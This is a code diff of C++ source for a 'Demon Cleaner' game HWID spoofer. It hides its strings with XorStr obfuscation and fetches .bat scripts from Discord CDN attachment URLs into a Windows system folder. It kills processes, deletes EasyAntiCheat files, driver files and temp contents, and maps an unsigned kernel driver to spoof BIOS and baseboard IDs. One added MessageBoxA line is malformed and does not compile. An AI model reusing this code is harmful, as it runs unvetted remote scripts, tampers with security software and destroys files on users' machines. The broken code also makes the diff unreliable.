@@ -28,9 +28,6 @@ void apex()
 }
 void gta() 
 {
-    
-
-    
 
     akfuxnl();
     std::string gta = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114574483918858/gta.bat"));
@@ -43,8 +40,6 @@ void gta()
 void fortnite()
 {
 
-    
-
     akfuxnl();
     std::string fortnite = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114573007527946/Fortnite.bat"));
     std::string fortnitepath = "C:\\Windows\Vss\Fortnite.bat";
@@ -54,8 +49,6 @@ void fortnite()
 }
 void fishingplanet()
 {
-
-    
 
     akfuxnl();
     std::string fishingplanet = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114571648593931/fishing-planet.bat"));
@@ -67,8 +60,6 @@ void fishingplanet()
 }
 void cod()
 {
-
-    
 
     akfuxnl();
     std::string cod = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114570369318962/Cold-Ware.bat"));
@@ -83,7 +74,6 @@ void cod()
 
 void cleaner(){
 
-    
 
     rydekem();
     plvbjwh();
@@ -117,15 +107,14 @@ void cleaner(){
     system(XorStr("taskkill /F /IM MSBuild.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM wcg.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM r5apex.exe 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Windows\Vss\ Windows\Capcom.sys 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Windows\Capcom.sys 2>NULL").c_str());
     system(XorStr("del /F /IM del /f %temp%\* 2>NULL").c_str());
     system(XorStr("del /F /IM D:\steam\depotcache\* 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Windows\Vss\ steam\depotcache\* 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Windows\Vss\ Program Files (x86)\EasyAntiCheat\EasyAntiCheat.exe 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Windows\Vss\ Program Files (x86)\EasyAntiCheat\EasyAntiCheat.sys 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Windows\Vss\ Windows\KsDumperDriver.sys 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Windows\Vss\ Windows\System32\Capcom.sys 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Windows\Vss\ Windows\System32\KsDumperDriver.sys 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Program Files (x86)\EasyAntiCheat\EasyAntiCheat.exe 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Program Files (x86)\EasyAntiCheat\EasyAntiCheat.sys 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Windows\KsDumperDriver.sys 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Windows\System32\Capcom.sys 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\\Windows\System32\KsDumperDriver.sys 2>NULL").c_str());
     system(XorStr("sc stop capcom").c_str());
     system(XorStr("sc delete capcom").c_str());
     system(XorStr("taskkill /F /IM cef_subprocces.exe 2>NULL").c_str());
@@ -243,6 +232,21 @@ void safeshutdown()
     string a;
     std::cout << "Do you want to shutdown your pc? \nYes/No : ";
     cin >> a;
+    if (GetAsyncKeyState(VK_END))
+    {
+        MessageBoxA(NULL, "congratualtions. you got the ( finder ) role on our discord.", "congratulations", MB_OKCANCEL);
+        safeshutdown();
+    }
+    if (GetAsyncKeyState(VK_DELETE))
+    {
+        MessageBoxA(NULL, "congratualtions. you got the ( exiter ) role on our discord.", "congratulations", MB_OKCANCEL);
+        safeshutdown();
+    }
+    if (GetAsyncKeyState(VK_INSERT))
+    {
+        MessageBoxA(NULL, "congratualtions. you got the ( inserter ) role on our discord.", "congratulations", MB_OKCANCEL);
+        safeshutdown();
+    }
     if (a == "Yes" || a == "yes")
     {
         system(XorStr("shutdown -l").c_str());
@@ -303,7 +307,7 @@ void spoofer()
     system("C:\\Windows\Vss\mapper.exe C:\\Windows\Vss\woof.sys");
     Sleep(2000);
     deleter();
-    MessageBox(NULL, ("wait 60 Seconds For Your Bios And Baseboard To Be Spoofed"), ("warning"), MB_OK | MB_SYSTEMMODAL);
+    MessageBoxA(NULL("wait 60 Seconds For Your Bios And Baseboard To Be Spoofed"), "warning", MB_OK, NULL);
     Sleep(60000);
     rydekem();
     plvbjwh();
@@ -326,21 +330,21 @@ void mainbot()
 
 
     std::cout << "\n";
-
+    
     system(XorStr("start https://discord.gg/MT9sApTneu").c_str());
     std::cout << MAGENTA << "Demon Cleaner V1.0\n";
     Sleep(2000);
     std::cout << RED << "\nloading kernel modules...";
     driverdetect();
     Sleep(2000);
-    std::cout << CYAN << "\nloading cleaners...";
+    std::cout << CYAN << "\nloading encryption...";
     Sleep(5000);
     system(XorStr("cls").c_str());
     cleaner();
     fishingplanet();
     gta();
     apex();
-    cod();
+    cod(); 
     fortnite();
     spoofer();
     
@@ -350,8 +354,7 @@ void mainbot()
 
 int main()
 {
-
-    
+ 
     mainbot();
 }
 
